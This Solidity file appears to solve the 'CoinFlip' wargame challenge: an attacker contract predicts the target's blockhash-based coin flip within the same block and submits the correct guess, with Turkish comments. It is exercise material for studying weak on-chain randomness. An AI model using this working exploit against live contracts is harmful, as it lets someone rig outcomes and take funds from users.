// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol"; 

contract CoinFlipAttacker {
    CoinFlip public target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _targetAddress) {
        target = CoinFlip(_targetAddress);
    }

    function attack() public {
        // Kurbanla aynı blokta kopya çekiyoruz
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool theAnswer = coinFlip == 1 ? true : false;

        // Bulduğumuz kesin doğru cevabı kurbana iletiyoruz
        target.flip(theAnswer);
    }
}